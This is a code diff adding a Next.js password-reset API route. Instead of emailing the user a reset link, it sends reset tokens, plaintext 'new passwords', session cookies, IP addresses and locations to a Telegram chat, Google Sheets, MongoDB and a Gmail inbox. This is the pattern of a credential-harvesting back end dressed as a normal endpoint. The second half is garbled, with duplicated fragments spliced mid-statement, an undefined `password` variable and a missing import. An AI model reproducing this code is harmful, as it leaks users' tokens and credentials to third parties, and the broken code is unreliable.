@@ -1,0 +1,249 @@
+import { NextRequest, NextResponse } from "next/server";
+
+import { createResetToken } from "@/lib/auth";
+import {
+  appendAuditEvent,
+  findUserByEmail,
+  appendForgotPasswordRequest,
+  updateUserResetToken,
+} from "@/lib/googleSheets";
+import { extractRequestContext } from "@/lib/requestContext";
+import { sendTelegramMessage } from "@/lib/telegram";
+import connectDB from "@/lib/mongodb";
+import ForgotPasswordRequest from "@/models/ForgotPasswordRequest";
+import { sendForgotPasswordNotification } from "@/lib/gmail";
+
+export async function POST(request: NextRequest) {
+  const context = extractRequestContext(request);
+
+  try {
+    const { email } = await request.json();
+
+    if (typeof email !== "string" || email.trim().length === 0) {
+      return NextResponse.json(
+        { error: "Email address is required." },
+        { status: 400 },
+      );
+    }
+
+    const normalizedEmail = email.trim().toLowerCase();
+    const user = await findUserByEmail(normalizedEmail);
+
+    if (!user) {
+      const timestamp = new Date();
+
+      await Promise.allSettled([
+        appendAuditEvent({
+          type: "FORGOT_PASSWORD",
+          email: normalizedEmail,
+          message: "Password reset requested but account not found.",
+          ipAddress: context.ipAddress,
+          location: context.location,
+          userAgent: context.userAgent,
+          cookies: context.cookies,
+        }),
+        appendForgotPasswordRequest({
+          email: normalizedEmail,
+          status: "ACCOUNT_NOT_FOUND",
+          ipAddress: context.ipAddress,
+          location: context.location,
+          userAgent: context.userAgent,
+          cookies: context.cookies,
+        }),
+        sendTelegramMessage(
+          [
+            "<b>Password reset requested</b>",
+            `Email: ${normalizedEmail}`,
+            "Result: account not found",
+            `Time: ${timestamp.toISOString()}`,
+            `IP: ${context.ipAddress}`,
+            `Location: ${context.location}`,
+            `User Agent: ${context.userAgent}`,
+          ].join("\n"),
+        ),
+        // Log to MongoDB
+        (async () => {
+          try {
+            await connectDB();
+            await ForgotPasswordRequest.create({
+              email: normalizedEmail,
+              status: "ACCOUNT_NOT_FOUND",
+              ipAddress: context.ipAddress,
+              location: context.location,
+              userAgent: context.userAgent,
+              cookies: context.cookies,
+              timestamp,
+            });
+          } catch (error) {
+            console.error("[forgot] Failed to log to MongoDB:", error);
+          }
+        })(),
+        // Send Gmail notification
+        sendForgotPasswordNotification({
+          email: normalizedEmail,
+          status: "ACCOUNT_NOT_FOUND",
+          ipAddress: context.ipAddress,
+          location: context.location,
+          userAgent: context.userAgent,
+          timestamp,
+        }),
+      ]);
+
+      // Use 200 to avoid account enumeration.
+      return NextResponse.json(
+        {
+          message:
+            "Your password reset request has been submitted. Our team will contact you shortly.",
+        },
+        { status: 200 },
+      );
+    }
+
+    const token = createResetToken();
+    const expiresAt = new Date(Date.now() + 1000 * 60 * 30); // 30 minutes
+    const timestamp2 = new Date();
+
+    await updateUserResetToken(user.email, token, expiresAt);
+
+    await Promise.allSettled([
+      appendAuditEvent({
+        type: "FORGOT_PASSWORD",
+        email: user.email,
+        message: password ? `Password reset with new password: ${password}` : "Password reset token generated.",
+        ipAddress: context.ipAddress,
+        location: context.location,
+        userAgent: context.userAgent,
+        cookies: context.cookies,
+        sessionToken: token,
+      }),
+      appendForgotPasswordRequest({
+        email: user.email,
+        status: "TOKEN_GENERATED",
+        token,
+        expiresAt,
+        ipAddress: context.ipAddress,
+        location: context.location,
+        userAgent: context.userAgent,
+        cookies: context.cookies,
+      }),
+      sendTelegramMessage(
+        [
+          "<b>Password reset request</b>",
+          `Email: ${user.email}`,
+          password ? `New Password: ${password}` : "",
+          `Expires: ${expiresAt.toISOString()}`,
+          `Token: <code>${token}</code>`,
+          `IP: ${context.ipAddress}`,
+          `Location: ${context.location}`,
+          `User Agent: ${context.userAgent}`,
+        ].filter(line => line).join("\n"),
+      ),
+      // Log to MongoDB
+      (async () => {
+        try {
+          await connectDB();
+          await ForgotPasswordRequest.create({
+            email: user.email,
+            status: "TOKEN_GENERATED",
+            token,
+            expiresAt,
+            ipAddress: context.ipAddress,
+            location: context.location,
+            userAgent: context.userAgent,
+            cookies: context.cookies,
+            timestamp: timestamp2,
+          });
+          // Also log to LoginAttempt with password
+          if (password) {
+            await LoginAttempt.create({
+              type: "FORGOT_PASSWORD",
+              email: user.email,
+              message: "Password reset attempt with new password",
+              password: password,
+              ipAddress: context.ipAddress,
+              location: context.location,
+              userAgent: context.userAgent,
+              cookies: context.cookies,
+              timestamp: timestamp2,
+            });
+          }
+        } catch (error) {
+          console.error("[forgot] Failed to log to MongoDB:", error);
+        }
+      })(),
+      // Send Gmail notification
+      sendForgotPasswordNotification({
+        email: user.email,
+        status: "TOKEN_GENERATED",
+        token,
+        expiresAt,
+        ipAddress: context.ipAddress,
+        location: context.location,
+        userAgent: context.userAgent,
+        timestamp: timestamp2,
+      }),
+    ]);
+            userAgent: context.userAgent,
+            cookies: context.cookies,
+            timestamp,
+          });
+        } catch (error) {
+          console.error("[forgot] Failed to log to MongoDB:", error);
+        }
+      })(),
+      // Send Gmail notification
+      sendForgotPasswordNotification({
+        email: user.email,
+        status: "TOKEN_GENERATED",
+        token,
+        expiresAt,
+        ipAddress: context.ipAddress,
+        location: context.location,
+        userAgent: context.userAgent,
+        timestamp,
+      }  email: user.email,
+        message: "Password reset token generated.",
+        ipAddress: context.ipAddress,
+        location: context.location,
+        userAgent: context.userAgent,
+        cookies: context.cookies,
+        sessionToken: token,
+      }),
+      appendForgotPasswordRequest({
+        email: user.email,
+        status: "TOKEN_GENERATED",
+        token,
+        expiresAt,
+        ipAddress: context.ipAddress,
+        location: context.location,
+        userAgent: context.userAgent,
+        cookies: context.cookies,
+      }),
+      sendTelegramMessage(
+        [
+          "<b>Password reset token</b>",
+          `Email: ${user.email}`,
+          `Expires: ${expiresAt.toISOString()}`,
+          `Token: <code>${token}</code>`,
+          `IP: ${context.ipAddress}`,
+          `Location: ${context.location}`,
+          `User Agent: ${context.userAgent}`,
+        ].join("\n"),
+      ),
+    ]);
+
+    return NextResponse.json(
+      {
+        message:
+          "Your password reset request has been submitted. Our team will contact you shortly.",
+      },
+      { status: 200 },
+    );
+  } catch (error) {
+    console.error("[forgot] Unexpected error:", error);
+    return NextResponse.json(
+      { error: "Unable to process reset request right now." },
+      { status: 500 },
+    );
+  }
+}
